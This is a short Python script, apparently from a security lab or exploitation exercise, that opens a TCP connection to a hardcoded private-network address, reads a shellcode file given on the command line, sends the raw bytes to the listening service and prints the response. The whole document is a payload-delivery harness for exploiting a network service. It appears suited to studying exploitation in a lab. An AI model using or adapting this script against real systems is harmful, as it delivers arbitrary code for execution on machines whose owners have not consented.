#!/usr/bin/python3
import socket
import time
import sys
from binascii import hexlify

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('192.168.60.20', 1234))
shell = open(sys.argv[1], 'rb').read()
print("Shellcode size:", len(shell))
sock.send(shell)
time.sleep(1)
print(sock.recv(1000))
